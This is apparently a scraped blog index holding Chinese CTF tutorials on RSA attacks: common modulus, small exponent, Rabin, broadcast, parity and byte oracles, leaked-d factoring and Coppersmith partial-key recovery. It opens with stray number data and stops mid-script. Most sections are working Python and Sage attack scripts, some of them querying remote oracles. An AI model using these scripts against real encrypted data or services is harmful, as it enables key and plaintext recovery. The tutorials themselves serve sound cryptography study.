23, 27, 29, 31, 41]13 [5, 7, 11, 15, 19, 21, 31, 33, 37, 41, 45, 47]17 [3, 5, 7, 11, 23, 27, 29, 31, 37, 39, 41, 45, 57, 61, 63, 65]19 [7, 11, 13, 21, 23, 29, 33, 35, 37, 39, 41, 43, 47, 53, 55, 63, 65, 69]23 [3, 5, 17, 21, 27, 31, 33, 35, 37, 39, 45, 47, 53, 55, 57, 59, 61, 65, 71, 75, 87, 89]29 [3, 11, 15, 17, 19, 21, 27, 31, 37, 39, 41, 43, 47, 55, 61, 69, 73, 75, 77, 79, 85, 89, 95, 97, 99, 101, 105, 113]31 [7, 13, 17, 19, 21, 29, 35, 37, 39, 47, 51, 53, 57, 59, 61, 63, 65, 67, 71, 73, 77, 85, 87, 89, 95, 103, 105, 107, 111, 117]37 [5, 13, 15, 17, 19, 23, 29, 31, 35, 39, 43, 45, 51, 55, 57, 59, 61, 69, 79, 87, 89, 91, 93, 97, 103, 105, 109, 113, 117, 119, 125, 129, 131, 133, 135, 143]41 [3, 7, 11, 13, 15, 17, 19, 27, 29, 35, 47, 53, 55, 63, 65, 67, 69, 71, 75, 79, 85, 89, 93, 95, 97, 99, 101, 109, 111, 117, 129, 135, 137, 145, 147, 149, 151, 153, 157, 161]43 [5, 11, 15, 23, 29, 31, 33, 35, 37, 45, 47, 59, 61, 65, 67, 69, 73, 77, 79, 83, 85, 87, 89, 93, 95, 99, 103, 105, 107, 111, 113, 125, 127, 135, 137, 139, 141, 143, 149, 157, 161, 167]47 [3, 5, 7, 13, 27, 29, 33, 41, 45, 51, 55, 57, 59, 63, 69, 71, 73, 75, 77, 79, 83, 85, 93, 95, 103, 105, 109, 111, 113, 115, 117, 119, 125, 129, 131, 133, 137, 143, 147, 155, 159, 161, 175, 181, 183, 185]53 [3, 5, 19, 21, 23, 27, 31, 33, 35, 39, 41, 45, 51, 55, 61, 65, 67, 71, 73, 75, 79, 83, 85, 87, 101, 103, 109, 111, 125, 127, 129, 133, 137, 139, 141, 145, 147, 151, 157, 161, 167, 171, 173, 177, 179, 181, 185, 189, 191, 193, 207, 209]59 [3, 7, 13, 15, 19, 27, 33, 35, 37, 51, 61, 63, 65, 69, 71, 73, 75, 77, 79, 87, 89, 93, 95, 97, 101, 107, 109, 113, 117, 119, 123, 127, 129, 135, 139, 141, 143, 147, 149, 157, 159, 161, 163, 165, 167, 171, 173, 175, 185, 199, 201, 203, 209, 217, 221, 223, 229, 233]61 [7, 11, 17, 21, 23, 29, 31, 33, 35, 37, 43, 51, 53, 55, 59, 63, 67, 69, 71, 79, 85, 87, 89, 91, 93, 99, 101, 105, 111, 115, 129, 133, 139, 143, 145, 151, 153, 155, 157, 159, 165, 173, 175, 177, 181, 185, 189, 191, 193, 201, 207, 209, 211, 213, 215, 221, 223, 227, 233, 237]Sb:2 [3, 5]3 [7]5 [7, 17]7 [11, 13, 15]11 [17, 23, 41]13 [21, 47]17 [29, 63]19 [29, 39, 47, 55]23 [5, 31, 47, 59, 61]29 [21, 41, 55, 79, 99, 113]31 [17, 19, 37, 39, 63, 95]37 [13, 17, 19, 23, 29, 31, 45, 61, 69, 87, 91, 93, 97, 103, 105, 119, 135, 143]41 [17, 35, 63, 67, 69, 99, 117, 145, 149, 151]43 [31, 33, 35, 37, 47, 61, 85, 87, 89, 105, 143]47 [41, 45, 59, 69, 71, 79, 95, 103, 147, 161, 181]53 [27, 61, 65, 67, 75, 83, 85, 87, 133, 167, 171, 173, 181, 189, 191, 193]59 [33, 51, 69, 79, 95, 97, 113, 119, 127, 141, 157, 159, 165, 185]61 [7, 17, 23, 55, 59, 69, 105, 111, 129, 139, 145, 177, 181, 191, 227, 233]30 2461 161933256682223994457337248907[3, 7, 7, 11, 23, 47, 63, 39, 31, 79, 39, 103, 151, 31, 59, 87, 127, 111, 30, 246][8, 12, 20, 28, 44, 52, 68, 76, 92, 116, 124, 148, 164, 172, 188, 212, 236, 244, 701, 257]mod: 845212916822667266857318935600434373326067214608775878317645775351280862168574601991542247144587 304495701573117440751890700669688521247884380170795996071115248354787 11163394479927415445540072763496426527918157732367271182635751615860314765242572717201537350357000818561932573315288396435774266341361498670863676541981221739664014401028330587564384701242669740856196369695370339038363927740181650866851457768843113763288312682772243647307True'''参考资料#Prime and Prejudice: Primality Testing Under Adversarial Conditions","link":"/b7ee330c.html"},{"title":"CTF中的RSA基本套路(1)","text":"碰到东西老是忘老是忘，要用的时候总是得自己去搜索模板浪费时间，所以只能整理整理一下套路和解题模板才能活下去这样子依赖库：gmpy2pycryptoRSA原理#私钥$n$,$d$，公钥$n$,$e$。其中n是两个素数$p$,$q$的乘积。$c$为密文，$m$为明文。$\\varphi(n)$为欧拉函数。其中:$d$是$e$模$\\varphi(n)$的逆元。我们有$$ \\varphi(n) = (p-1)(q-1) $$$$ed \\equiv 1 \\mod \\varphi(n)$$$$ encrypt:c \\equiv m^e \\mod n $$$$ decrypt:m \\equiv c^d \\mod n $$openssl使用#使用openssl查看pem文件：1openssl rsa -pubin -text -modulus -in public.pem使用openssl和私钥解密1openssl rsautl -decrypt -in flag -inkey privatekey -out flag.txt常规#场景#已知$p$、$q$、$c$解法#求$\\varphi(n)$，再求出$d$即可12345678910from Crypto.Util.number import inverse,long_to_bytesp = q = n = p*qphi = (p-1)*(q-1)e = d = inverse(e,phi)c = m = pow(c,d,n)print(long_to_bytes(m))模不互素#场景#已知如下：$$n_1 = p \\times q_1 $$$$ n_2=p \\times q_2 $$$$c_1= m^e \\mod n_1 $$$$c_2 = m^e \\mod n_2$$解法#求出$n_1$和$n_2$的公因子，即可解得$p$和$q$123456789101112131415161718from libnum import xgcdfrom Crypto.Util.number import inverse,long_to_bytesn1 = n2 = c1 = c2 = e = p = xgcd(n1,n2)[2]q1 = n1//pq2 = n2//pphi1=(p-1)*(q1-1)phi2=(p-1)*(q2-1)d1 = inverse(e,phi1)d2 = inverse(e,phi2)m1 = pow(c1,d1,n1)m2 = pow(c2,d2,n2)print(long_to_bytes(m1))print(long_to_bytes(m2))共模攻击#场景#模数$n$相同，指数$e_1、e_2$不同且互质已知：$$c_1=m^{e_1}\\mod n$$$$c_2 = m^{e_2}\\mod n$$解法#根据扩展欧几里得算法求出$re_1+se_2=1 \\mod n$的整数$r、s$根据$$\\begin{equation}c_{1}^{r} c_{2}^{s} \\equiv m^{r e_{1}} m^{s e_{2}} \\bmod n \\equiv m \\mod n\\end{equation}$$得到明文12345678910111213141516171819from libnum import xgcdfrom Crypto.Util.number import inverse,long_to_bytesn = c1 = c2 = e1 = e2 = s = xgcd(e1,e2)s1 = s[0]s2 = s[1]if s1 &lt; 0: s1 = - s1 c1 = inverse(c1, n)elif s2 &lt; 0: s2 = - s2 c2 = inverse(c2, n)m = pow(c1, s1, n)*pow(c2, s2, n) % n print(long_to_bytes(m))e小指数攻击#场景#当$e$很小的时候，例如2、3，此时可能可以通过直接暴力开根的方式进行攻击解法#以$e=3$为例，已知$c\\equiv m^3 \\mod n$，因此有：$$m^3=c+kN$$$$m=\\sqrt[3]{c+kN}$$1234567891011import gmpy2from Crypto.Util.number import long_to_bytesn = e = 3c = i = 0while(True): a,b = gmpy2.iroot(c+i*n,3) if(b==1): print(long_to_bytes(a)) exit(0)Rabin攻击#场景#当指数$e=2$，且已知$p$和$q$解法#计算$$m_p = \\sqrt[2]{c} \\mod p$$$$m_q= \\sqrt[2]{c} \\mod q$$扩展欧几里得求$y_p$和$y_q$$$y_p p+y_q q=1$$解得4个明文$$a =\\left(y_{p} \\cdot p \\cdot m_{q}+y_{q} \\cdot q \\cdot m_{p}\\right) \\bmod n $$$$b =n-a $$$$c =\\left(y_{p} \\cdot p \\cdot m_{q}-y_{q} \\cdot q \\cdot m_{p}\\right) \\bmod n $$$$d =n-c$$条件：当$p\\equiv q\\equiv3 \\mod 4$时，有$$m_p=c^{(p+1)/4} \\mod p$$$$m_q=c^{(q+1)/4} \\mod q$$满足条件时#123456789101112import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss)不满足条件时#转换为模平方根问题用python（代码来自yuri）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107import gmpy2import randomdef exgcd(r0, r1): x0, y0 = 1, 0 x1, y1 = 0, 1 x, y = r0, r1 r = r0 % r1 q = r0 // r1 while r: x, y = x0 - q * x1, y0 - q * y1 x0, y0 = x1, y1 x1, y1 = x, y r0 = r1 r1 = r r = r0 % r1 q = r0 // r1 return xdef Jacobi(n, m): n = n % m if n == 0: return 0 Jacobi2 = 1 if not (n &amp; 1): k = (-1) ** (((m**2 - 1) // 8) &amp; 1) while not (n &amp; 1): Jacobi2 *= k n &gt;&gt;= 1 if n == 1: return Jacobi2 return Jacobi2 * ((-1) ** ((((m - 1) // 2) * ((n - 1) // 2)) &amp; 1)) * Jacobi(m % n, n)def CRT(b, m): M = 1 for i in range(len(b)): M *= m[i] ans = 0 for i in range(len(b)): ans += b[i] * M // m[i] * exgcd(M // m[i], m[i]) return ans % Mdef solve(a, p): a_1 = gmpy2.invert(a, p) s = p - 1 t = 0 while s % 2 == 0: t += 1 s &gt;&gt;= 1 n = 0 while True: n = random.randint(1, p-1) if Jacobi(n, p) == -1: break b = pow(n, s, p) x_t_1 = pow(a, (s+1)//2, p) assert pow(b, 2**t, p) == 1 assert pow(b, 2**(t-1), p) == p-1 x, j, temp = 0, 0, 0 for i in range(0, t-1): x = pow(a_1*(x_t_1**2), 2**(t-2), p) if x == 1: j = 0 elif x == p-1: j = 1 else: exit(0) t -= 1 temp = x_t_1 x_t_1 = (x_t_1 * (b**(j**(2**i)))) % p else: if x == 1: return temp, -temp % pp = q = n = p * qe = 2c = a, b = None, Nonewhile True: try: a = solve(c % p, p) assert pow(a[0], e, p) == c % p assert pow(a[1], e, p) == c % p break except: passwhile True: try: b = solve(c % q, q) assert pow(b[0], e, q) == c % q assert pow(b[1], e, q) == c % q break except: passprint(bytes.fromhex(hex(CRT([a[0],b[0]],[p,q]))[2:]))print(bytes.fromhex(hex(CRT([a[0],b[1]],[p,q]))[2:]))print(bytes.fromhex(hex(CRT([a[1],b[0]],[p,q]))[2:]))用sage使用一句话Mod(c_square, q).sqrt(all=True)分别求出$m_p$和$m_q$，代回去解得可能的明文n分解攻击#当n很小或者满足一定条件时，可以进行暴力分解yafufactordb当$d&lt;1/3 N^{1/4}$时，通过Wiener’s attack能够攻击得到$d$当$p、q$十分接近时，可以使用费马分解分解$n$当$q$较小，即$|p-q|$较大时，可以爆破$q$当$d&lt;N^{0.292}$时，通过Boneh Durfee Method分解$n$广播攻击#场景#给定了不同的模数$n_i$，但指数$e$相同已知:$$c_1=m^e\\mod n_1$$$$c_2=m^e\\mod n_2$$$$c_3=m^e\\mod n_3$$解法#使用中国剩余定理进行广播攻击12345678910111213141516171819202122232425262728293031323334from gmpy2 import *from Crypto.Util.number import long_to_bytesdef broadcast(n1, n2 ,n3, c1, c2, c3): n = [n1, n2, n3] C = [c1, c2, c3] N = 1 for i in n: N *= i Ni = [] for i in n: Ni.append(N / i) T = [] for i in range(3): T.append(long(invert(Ni[i], n[i]))) X = 0 for i in range(3): X += C[i] * Ni[i] * T[i] m = X % N return mn1 = n2 = n3 = e = c1 = c2 = c3 = result = broadcast(n1,n2,n3,c1,c2,c3)m = iroot(result, e)print(long_to_bytes(result))参考资料#https://github.com/ctf-wiki/ctf-wikihttps://www.freebuf.com/articles/others-articles/161475.htmlhttps://github.com/ius/rsatool/blob/master/rsatool.pyhttps://github.com/pablocelayes/rsa-wiener-attackhttps://xz.aliyun.com/t/2446#toc-18","link":"/509b3160.html"},{"title":"CTF中的RSA基本套路(2)","text":"第二部分主要是一些Oracle相关的内容依赖库：gmpy2pycryptopwntoolssage选择密文攻击#场景#假设$Alice$创建密文$C=P^e \\mod n$，并发送给$Bob$，并且我们有一次选择密文进行解密的机会，此时我们可以拦截$C$，并通过选择密文攻击，求出$P$解法#选择任意一个$G(n)$内与$n$互素的$X$(一般就是2啦)计算$Y=C \\times X^e \\mod n$由于选择密文攻击，将$Y$作为密文我们可以得到$Z=Y^d \\mod n $最后由于可以通过逆元求出$P$12345678910111213from pwn import *from gmpy2 import invertfrom Crypto.Util.number import long_to_bytesp = remote(ip,port)C = n = e = X = 2X_e = pow（X,e,n)p.sendline(str((X_e*c)%n)Z = int(p.recvline())result = (Z*long(invert(X,n)))%nprint(long_to_bytes(result))parity oracle#场景#假设存在一个 $Oracle$，它会对一个给定的密文进行解密，并且会检查解密的明文的奇偶性，并根据奇偶性返回相应的值，比如 1 表示奇数，0 表示偶数。那么给定一个加密后的密文，我们只需要 $log(N)$ 次就可以知道这个密文对应的明文消息解法#假设$C=P^e \\mod N$第一次我们发送$C\\times 2^e = (2P)^e \\mod N$给服务器，服务器会返回$2P\\mod N$我们知道：$2P$是偶数，因此$(2P)^e$也是偶数$N$是奇数（不考虑存在因子为2时）那么：服务器返回奇数时，说明$2P&gt;N$，且减去了奇数个$N$同时我们又知道$P&lt;N$，即$N/2 \\leq P &lt; N$服务器返回偶数时，说明$0\\leq P &lt; N/2$归纳：假设第$i$次时，我们有$$xN/2^i \\leq P &lt; (x+1)N/2^i$$在第$i+1$次时，我们可以得到$$2^{i+1}P\\mod N=2^{i+1}P-kN$$$$0\\leq 2^{i+1}P-kN &lt;N$$$$kN/2^{i+1} \\leq P &lt; (k+1)N/2^{i+1}$$根据第$i$次结果我们分子分母同乘2，有$$2xN/2^{i+1} \\leq P &lt; 2(x+1)N/2^{i+1}$$那么：服务器返回奇数，则$ k$ 必然是一个奇数，$k=2y+1$， 那么 $(2 y N+N) / 2^{i+1} \\leq P&lt;(2 y N+2 N) / 2^{i+1}$。与此同时，由于 $P$ 必然存在，所以第 $i+1$ 得到的这个范围和第$ i$ 次得到的范围必然存在交集。所以$ y$ 必然与$ x $相等。服务器返回偶数，则$ k$ 必然是一个偶数，$k=2y$，此时 $y $必然也与 $x $相等，那么$2 x N / 2^{i+1} \\leq P&lt;(2 x N+N) / 2^{i+1}$总结：123456lb = 0ub = Nif server returns 1 lb = (lb+ub)/2else: ub = (lb+ub)/212345678910111213141516171819202122232425262728293031323334353637383940from pwn import *import time,decimal,binasciifrom Crypto.Util.number import long_to_bytesp = remote(ip,port)def oracle(c1): global p p.sendline(str(c1)) res = int(p.recvuntil(\"\\n\").strip()) if res == 0: return 0 if res == 1: return 1 else: assert (0)def partial(c, n): global c_of_2 k = n.bit_length() decimal.getcontext().prec = k lower = decimal.Decimal(0) upper = decimal.Decimal(n) for i in range(k): possible_plaintext = (lower + upper) / 2 flag = oracle(c) if not flag: upper = possible_plaintext else: lower = possible_plaintext c = (c * c_of_2) % n print(i,flag,int(upper - lower)) return int(upper) e = c = n = c_of_2 = pow(2,e,n)m = partial((c * c_of_2) % n, n)print(long_to_bytes(m))byte oracle#场景#假设目前存在一个$ Oracle$，它会对一个给定的密文进行解密，并且会给出明文的最后一个字节。那么给定一个加密后的密文，我们只需要 $log_{256}n$ 次就可以知道这个密文对应的明文消息。解法#是parity oracle的扩展，此时泄露一个byte，因此我们将原来的发送$C\\times 2^e$改成$C\\times 256 ^e$即可已知$$C=P^e \\mod N$$第一次我们发送$$C\\times 256^e = (256P)^e \\mod N$$服务器返回$256P \\mod N$此时有：$256P$为偶数$N$为奇数由于$P&lt;N$,我们有$256P \\mod N=256P -kN(k&lt;256)$，并且对于不同的$k_1，k_2$,我们有$256P-k_1 n \\not\\equiv 256P-k_2 n \\mod 256$由于是模$256$，所以$256P-kn \\equiv -kn \\mod 256$，因此我们首先可以枚举$0-255$情况下的最后一个字节，并得到映射表当服务器返回最后一个字节b，我们就可以通过映射表得到$k$，即减去了$k$个$N$，有$kN \\leq 256P \\leq (k+1)N$归纳：假设在第$i$次时，有$$xN/256^i \\leq P &lt; (x+1)N/256^i$$当第$i+1$次时，发送$C*256^{(i+1)e}$，服务器返回$$256^{i+1}P \\mod N = 256^{i+1}P-kN$$$$0\\leq 256^{i+1}P-kN&lt;N$$$$kN/256^{i+1}\\leq P&lt;256(x+1)N/256^{i+1}$$总结：123456lb = 0ub = Nk = mab[b]interval = (ub-lb)/256lb = lb + interval * kub = lb + interval1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *import timeimport binasciifrom Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesfrom gmpy2 import invertp = remote(ip,port)e =c = n = print(\"e:\",e)print(\"c:\",c)print(\"n:\",n)d = {}for k in range(0,256): d[(-k*n)%256] = kprint(d)lb = 0ub = nfor i in range(1,256): m = (c * pow(256,i*e,n)) %n p.sendline(str(m)) b = int(p.recvline()) k = d[b] interval = int((ub-lb)/256) lb = lb + interval * k ub = lb + interval print(\"ub-lb:\",ub-lb)print(\"lb:\",lb)print(\"ub:\",ub)i = lb# 没控制好边界，所以最后暴力一段while(i&lt;=lb+30000): m = pow(i,e,n) if(m==c): print(\"result:\",i) p.sendline(str(i)) print(p.recvline()) exit(0) i+=1print(\"no result\")d泄露攻击#场景#题目同时给出了$d$、$e$和$N$解法#我们知道$ed \\equiv 1\\mod \\varphi(n)$，则存在$k$，使得$$ed-1 = k \\varphi(n)$$又有$\\forall a \\in Z^{*}_n $，满足$a^{ed-1} \\equiv 1 \\mod n$，令$$ed-1 = 2^s t$$其中，$t$是一奇数，可以证明对于至少一半的$\\forall a \\in Z^{*}_n $，存在一个$i \\in [1,s]$，使得成立，如果$a,i$满足上述条件，可以对$n$进行暴力分解123456789101112131415161718192021222324252627282930313233343536373839import fractions,randomdef factor_modulus(n, d, e): \"\"\" Efficiently recover non-trivial factors of n See: Handbook of Applied Cryptography 8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287) http://www.cacr.math.uwaterloo.ca/hac/ \"\"\" t = (e * d - 1) s = 0 while True: quotient, remainder = divmod(t, 2) if remainder != 0: break s += 1 t = quotient found = False while not found: i = 1 a = random.randint(1,n-1) while i &lt;= s and not found: c1 = pow(a, pow(2, i-1, n) * t, n) c2 = pow(a, pow(2, i, n) * t, n) found = c1 != 1 and c1 != (-1 % n) and c2 == 1 i += 1 p = fractions.gcd(c1-1, n) q = n // p return p, qn多因子#场景#当$n$由多个因子组成时解法#多个因子时，我们根据欧拉函数求得对应的$\\varphi(n)$即可$$\\varphi(x)=x\\prod_{i=1}^n (1-1/p_i)$$其中$p_i$是$x$的所有质因数选择明文攻击#场景#存在一个加密$Oracle$，能够返回加密后的密文。求出对应的$e$和$n$解法#求解e#当$e$较小时，可以通过$sage$的$bsgs$函数求得$e$123456789# sage -python script.pyfrom sage.all import *n = n = Zmod(n)m = m = ZmodN(m)c = c = ZmodN(c)print(bsgs(m,c,(3, 2 ** 40)))求解n#分别加密$2、4、8、16…$我们可以得到：$$c_2 = 2^e \\mod n$$$$c_4 = 4^e \\mod n$$$$c_8 = 8^e \\mod n$$那么：$$c_2^2 \\equiv c_4 \\mod n$$$$c_2^3 \\equiv c_8 \\mod n$$所以有：$$c_2^2 -c_4 = kn$$$$c_2^3 -c_8 = tn$$最后求得他们的公因子就是$n$，使用的$Oracle$数据越多，公因子是$n$的概率越大123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwm import *import libnump = remote(ip,port)p.recvuntil(\"m: \")p.sendline(\"2\")c2 = int(p.recvline())p.recvuntil(\"m: \")p.sendline(\"4\")c4 = int(p.recvline())p.recvuntil(\"m: \")p.sendline(\"8\")c8 = int(p.recvline())p.recvuntil(\"m: \")p.sendline(\"16\")c16 = int(p.recvline())p.recvuntil(\"m: \")p.sendline(\"32\")c32 = int(p.recvline())pn = pow(c2,2)-c4qn = pow(c2,3)-c8rn = pow(c2,4)-c16sn = pow(c2,5)-c32l = []n = libnum.xgcd(pn,qn)[2]l.append(n)n = libnum.xgcd(pn,rn)[2]l.append(n)n = libnum.xgcd(pn,sn)[2]l.append(n)n = libnum.xgcd(qn,rn)[2]l.append(n)n = libnum.xgcd(qn,sn)[2]l.append(n)n = libnum.xgcd(rn,sn)[2]l.append(n)n = 0for _ in l: if(l.count(_)&gt;=3): n = _if(n==0): print(\"nope\") exit(0)else: print(\"n:\",n)参考文献#https://github.com/ctf-wiki/ctf-wikhttps://code.felinae98.cn/ctf/crypto/rsa-parity-oracle/https://xz.aliyun.com/t/2446https://github.com/ius/rsatool/blob/master/rsatool.py","link":"/7bb662a3.html"},{"title":"CTF中的RSA基本套路(3)","text":"第三部分是基本的Coppersmith相关内容依赖库：gmpy2pycryptopwntoolssage引子#$c=m^e \\mod N$, 当 $|m| &lt; N^{1/e}$时，我们能很快求得$m$的值当$|m|&gt;N^{1/e}$时，如果已知$m$的部分信息$m_0$，能不能恢复未知$x$的值，这就是$Corppersmith$ 要解决的问题$$c = (m_0+x)^e \\mod N$$已知部分明文攻击#引理1假设$N$是一个未知因子组成的数，且存在一个因子$b \\geq N^{\\beta},0 \\lt \\beta \\leq 1$,$f(x)$ 是一个一元$\\delta$阶多项式，且$c \\geq 1$，那么可以在$O(c\\delta ^5 log^9(N))$复杂度内求解下列等式的所有的$x_0$$$f(x)=0 \\mod b, |x_0| \\leq c N^{\\beta ^2/\\delta}$$场景#设$m=m_0 + x_0$，其中$x_0$是未知的，那么我们可以列出以下多项式$$f(x)=(m_0+x)^e - c \\mod N , f(x_0)=0$$当$e$和$x_0$很小的时候，$Coppersmith$就能求出$x_0$的值解法#在这个场景中，我们知道$b=N,\\delta=e,\\beta=1$，设$c=1$，此时$|x_0| \\leq c N^{\\beta ^2/\\delta} = N^{1/e}$，因此，为了求解$x_0$，我们需要知道原消息$m$至少(1-1/e)​*N.bit_length()比特的信息碰到的最常见的是已知明文高位攻击，但其实未知的部分在哪里都可以，只要是连贯的，就能构造对应的$f(x)$进行求解已知明文高位#12345678910e = c = n = kbits = # x的未知bit数目m0 = #明文的高位信息PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m0 + x)^e - cf = f.monic()x0 = f.small_roots(X=2^kbits,beta=1)[0] # 在0 - 2^kbits范围内求解小根，beta为1和上述分析的beta一致，也就是对应factor为Nprint(x0)已知明文低位#将构造的函数改为以下即可1f = ((m0 + ZmodN((pow(2,m0.nbits())))*x)^e) - c当然,如果是明文的中间部分bit未知，也是相同的去修改对应的多项式f(x)即可，具体题目见https://cryptohack.org/challenges/rsa/ 中的Null or Never题目（Coppersmith是该题的一种解法）已知部分p攻击#场景#已知$p=p0+x$,且$|x|&lt;N^{1/4}$时，也就是知道$p$的大约一半bits信息时，可以得到对应的$x$，从而对$N$进行分解解法#此时根据$p=p0+x0$我们知道$p0 = x0 \\mod p$，所以可以列出多项式$f(x)= p0-x \\mod p，f(x_0)=0 \\mod p$对应到引理中，显然$b=p$，由于在$RSA$中，$p和q$经常为同比特的素数，所以设置$beta=0.4，0.3$等都可已知p高位#12345678n = p0 = # 已知的p的高位kbits = PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p0f = f.monic()x0 = f.small_roots(X=2^kbits, beta=0.3)[0] # beta=0.3表明存在factor 大于n ^0.3print(x0 + p0)已知p低位#同样的，已知p低位或者中间部分未知，修改对应的f(x)的表达式即可，例如已知p低位，则12ZmodN=Zmod(n)f(x) = x*ZmodN(pow(2,p0.nbits()))+p0部分私钥暴露攻击#场景#当已知私钥的部分bit信息，私钥$d=d0+x$，$d0$ 的bit数目约为$d$的$1/4$时，可以恢复私钥$d$解法#根据论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》假设私钥$d$的bit数目为$kbits$,且已知的是私钥的低位那么我们可以知道$d0 = d \\mod 2^{kbits}$所以有$ed0=1+k(N-s+1)\\mod 2^{kbits},(s=p+q)$所以我们可以通过解$ed0x-kx(N-x+1)= x \\mod 2^{kbits}$ 得到可能的$s \\mod 2^{kbits}$的值，继续通过求解$ p^2-sp+N=0 \\mod 2^{kbits}$，就能得到$p \\mod 2^{kbits}$的值了，进而把问题转换为已知部分$p$攻击。下面这个日本大哥的脚本是把1、2两步结合起来列式了，所以只求一个方程解出了部分$p$123456789101112131415161718192021222324252627282930313233def partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.3) # find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3，在实际使用脚本的时候可以自己手动改nbits等参数，理解了原理再看脚本就很清楚明了了 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p)def find_p(d0, kbits, e, n): X = var('X') for k in xrange(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p: return pif __name__ == '__main__': n = e = d0 = kbits = # 未知的d的bits数目 p = find_p(d0, kbits, e, n) print(&quot;found p: %d&quot; % p) q = n//p print(inverse_mod(e, (p-1)*(q-1)))如果将1、2两步分开列式，则修改函数find_p如下12345678910111213def find_p(d0, kbits, e, n): X = var('X') for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1)== X], 2^kbits) for x in results: s = ZZ(x[0]) pvar = var('p') p_results = solve_mod([pvar*pvar-s*pvar+n==0],2^kbits) for p0 in p_results: p0 = ZZ(p0[0]) p = partial_p(p0, kbits, n) if p: return p但是速度上好像慢一些。同样的已知d高位等也可以进行求解，例如已知d高位，那么第一步解出来的其实是可能的p的低位，所以在解部分p时，修改f = (2^kbits)*x + p0即可例题：2020 天翼杯 hardRSA#题目脚本：1234567891011121314# chall.py# flag{6809781d08e120627e623dcdafe26b8a}p = getPrime(510)q = getPrime(510)r = getPrime(510)e = 7m = bytes_to_long(os.urandom(30) + flag)n = p * q * rd = invert(e, (p - 1) * (q - 1) * (r - 1))c = pow(m, e, n)print(n // p)print(p)print(c)print(hex(d % (1 &lt;&lt; 540)))从题目看也是Coppersmith partial d的情况，只是这里由于$n$由$p、q、r$三个素数组成，因此需要我们重新推导同余方程已知：$kbits = 540$、$p$、$qr$、$d_0$的值，$d_0 = d \\mod 2^{kbits}$推导如下：$$\\begin{align*}ed_0&amp; = 1 +k(p-1)(q-1)(r-1) \\&amp; = 1+ k(pq-p-q+1)(r-1) \\&amp; = 1+k(pqr-pr-qr-1-pq+p+q+r) \\&amp; = 1+k(N-p(r+q)+s-qr-1) \\&amp; = 1+k(N-p(r+q)+(r+q)+p-qr-1) \\&amp; = 1+k(N-ps+s+p-qr-1) \\&amp; = 1+k(p-1)(qr-s+1)\\mod 2^{kbits},(s=q+r) \\tag{1}\\end{align*}$$通过上式可以求得所有的$s \\mod 2^{kbits}$的值，同时我们知道$$q^2-sq+qr = 0 \\mod 2^{kbits} \\tag{2}$$联立公式$1 \\times q$和公式$2 \\times k(p-1)$，可以得到公式$$ed_0q = q + kq(p-1)(qr-s+1) \\tag{3}$$$$k(p-1)qr = kq(p-1)(s-q) \\tag{4}$$相加得到：$$ed_0q + k(p-1)qr = q+kq(p-1)(qr-q+1)$$即：$$ed_0q + k(p-1)qr-k(p-1)q(qr-q+1) = q \\mod 2^{kbits}$$解上述同余方程，即可得到$q \\mod 2^{kbits}$由于$kbits=540$，而$q$只有$510 bits$，所以解出来的就是可能的$q$的值，再通过$qr % q==0$过滤即可12345678910111213141516171819202122def find_q(d0, kbits, e, qr, p): X = var('X') for k in range(1, e + 1): temp = k*(p-1) results = solve_mod([e*d0*X+temp*qr-temp*X*(qr-X+1)==X], 2 ^ kbits) for x in results: q = ZZ(x[0]) if qr % q == 0: return q return Noneif __name__ == '__main__': qr = 6857671284539062742975668483013695756136974308830302383869017675211748459038460434623218652374536550644287079851235538790745857383008797698872874798021995947967308637270510423795384863442755166813716746318469915880844736019524077541319597047087620854791342900521099848683663304636436936596021386279685708537 p = 2141698433991046082370939321691850154692026423424010392532982575546199921995522418737105878977898158159119041866620684371362271661642476751663585379591337 c = 4329606906986929520922207896899782825966852252045645553852666134465727605375552409314262439896695961792039946511877813768609658516837096110397826574615865145364406310497152725490038135469839136190625952342503082553246584871237205558902774064100332461452316195663446307120094941991930964324406679011451626126064494215289724959537793057773764253924636259378833228904446486925068109314698993641720938647836132806653451109926428309922461595730642461604303078237048 d0 = 0x8e6f66a517d9c8a610eb65dac5a613e72d47a29beaa5c77a9eb857e0db5d09eadf3a317776fdf27b0d85db0b6677afc8e0683d6dc2b4580281b6e99c3050f649213c37 e = 7 kbits = 540 q = find_q(d0, kbits, e, qr, p) print(q) # q = 2505948797318027758820680066583904581437202552654881626817593379353882875609223855015707273771918291251411562855290697544161987271016184806489110771554269short padding attack#场景#Short padding attack经常和 相关消息攻击结合(https://blog.ycdxsb.cn/2decc525.html#more)使用我们已知$c_1 = m^e \\mod n$，$c_2 = (m+padding)^e \\mod n $，但我们不知道具体的padding值是多少解法#首先通过short padding attack 求出padding的值，然后再使用相关消息攻击求得消息$m$123456789101112131415161718192021222324252627282930313233def short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.5)[0] # find root 